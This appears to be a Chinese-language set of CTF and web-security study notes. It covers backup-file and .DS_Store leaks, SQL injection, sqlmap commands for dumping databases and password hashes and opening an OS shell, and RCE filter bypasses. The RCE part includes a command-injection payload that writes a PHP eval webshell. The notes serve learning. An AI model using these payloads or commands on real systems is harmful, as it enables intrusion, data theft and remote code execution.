### 网站备份

------
**常见的网站源码备份文件后缀**
- tar
- tar.gz
- zip
- rar
- bak

**常见的网站源码备份文件名**
- web
- website
- backup
- back
- www
- wwwroot
- temp









### 编码

------

```
1:0x9字符是 水平定位符
2:0xa字符是 换行符
3:0xb字符是 垂直定位符
4:0xc字符是 换页键
5:0xd字符是 归位符
6:0x20字符是 控制设备4(空格)
7:0x2b字符是 +
```











### **vim缓存**
------

在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。

以 index.php 为例：第一次产生的交换文件名为 .index.php.swp。

再次意外退出后，将会产生名为 .index.php.swo 的交换文件。

第三次产生的交换文件则为 .index.php.swn。

注意：最前面有一个点，也就是说应该是`http://xxxxx.com/.index.php.swp`而不是`http://xxxxx.com/index.php.swp`











### **.DS_Store**
------

.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。如文件的图标位置或背景色，相当于Windows的desktop.ini。 其删除以后的副作用就是这些信息的失去。通过.DS_Store可以知道这个目录里面所有文件的清单。	

和别人交换文件（或你做的网页需要上传的时候）应该把 .DS_Store 文件删除比较妥当，因为里面包含了一些你不一定希望别人看见的信息。尤其是网站，通过 .DS_Store 可以知道这个目录里面所有文件的清单，很多时候这是一个不希望出现的问题。

**DS_Store文件泄漏**
.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。











### **SQL注入**

------

column_name : 列的名称

Information_schema.columns : 表示所有的列的信息

Information_schema : 表示所有信息，包括库、表、列

Information_schema.tables : 表示所有的表的信息

table_schema : 数据库的名称

table_name : 表的名称



关于注释：GET（`--+`），POST（`#`）

@@basedir  得到mysql路径









### **sqlmap基础命令**
------

查询sqlmap是否存在注入命令 sqlmap.py -u url/?id=1 

查询当前用户下的所有数据库 sqlmap.py -u url/?id=1 --dbs 

获取数据库的表名 sqlmap.py -u url/?id=1 -D (数据库名) --tables 

获取表中的字段名 sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) --columns 

获取字段的内容 sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) -C (表内的字段名) --dump 

查询数据库的所有用户 sqlmap.py -u url/?id=1 --users 

查询数据库的所有密码 sqlmap.py -u url/?id=1 --passwords 

查询数据库名称 sqlmap.py -u url/?id=1 --current-db











### **sqlmap**

------

—cookie  –level 2

—ua lever 3

sqlmap可以在请求中伪HTTP的Referer头，当--level参数大于等于3时，会尝试进行refer注入

–referer  level 5

有的时候扫不出注入点，也是需要提升 level 等级



脚本名： space2comment.py  作用：用注释/**/替换空格字符' '

 sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤'>' ,用GREATEST替换大于号）等。



绕过空格过滤的方法   /**/、()、%0a





**sqlmap常用语法**


-u 指定一个url连接，url中必须有？xx=xx 才行

-l 后接一个log文件，可以是burp等的代理的log文件

-m 后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url

-r 可以将一个post请求方式的数据包保存在一个txt中，sqlmap会通过post方式检测目标

--method=METHOD 指定是get方法还是post方法

--data=DATA 指明参数是哪些

--cookie=COOKIE 指定测试时使用的cookie

--user-agent=AGENT 指定一个user-agent的值进行测试

--random-agent 使用随机user-agent进行测试

--referer=REFERER 指定http包中的refere字段

-p TESTPARAMETER 知道测试的参数

--level=LEVEL 设置测试的等级

–string=STRING` 在基于布尔的注入时，有的时候返回的页面一次一个样，需要我们自己判断出标志着返回正确页面的标志，会根据页面的返回内容这个标志（字符串）判断真假，可以使用这个参数来制定看见什么字符串就是真。。

--technique=TECH 指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用）

–time-sec=TIMESEC` 在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。

–union-cols=UCOLS 联合查询的尝试列数

--current-user 当前用户

--current-db 当前数据库

–is-dba 是否为dba

–users 查询一共都有哪些用户

–passwords 查询用户密码的哈希

--dbs 目标服务器中有什么数据库

--tables 目标数据库有什么表

--columns 目标表中有什么列

–dump 这个就不解释了

–sql-query=QUERY` 执行一个sql语句。

–sql-shell` 创建一个sql的shell。

--os-shell 创建一个对方操作系统的shell，远程执行系统命令。









### **MySQL**

------

delete，drop，truncate 都有删除表的作用，区别在于：

-  1、delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比方，delete 是单杀，truncate 是团灭，drop 是把电脑摔了。
-  2、delete 是 DML 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和 drop 是 DDL 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手，后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。
-  3、执行的速度上，**drop>truncate>delete**，打个比方，drop 是神舟火箭，truncate 是和谐号动车，delete 是自行车。











### **RCE**

------

> 过滤 cat

**方法一**当cat被过滤后,可以使用一下命令进行读取文件的内容
(1)more:一页一页的显示的显示档案内容
(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示
(5)tail:查看尾几行
(6)nl:显示的时候,顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器,这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看



**方法二**
一句话木马
构造payload如下：

CTFHub  RCE –（命令注入，过滤cat）：  `127.0.0.1&echo "<?php @eval(\$_POST['a']);?>" >>shell.php`



**方法三**
反斜杠 ： 例如 ca\t fl\ag.php
连接符： 例如 ca’‘t fla‘’g.txt



> 过滤空格，其实就`;`就行呀

**当空格被过滤后,可以使用一下命令进行读取文件的内容**
`<` `<>` ` >`重定向符
`%09`(需要php环境)(tab)
`%20`(space)
`${IFS}`
`$IFS$9`
{cat,flag.php} //用逗号实现了空格功能
`%20`

PS：为什么我只有`<`可以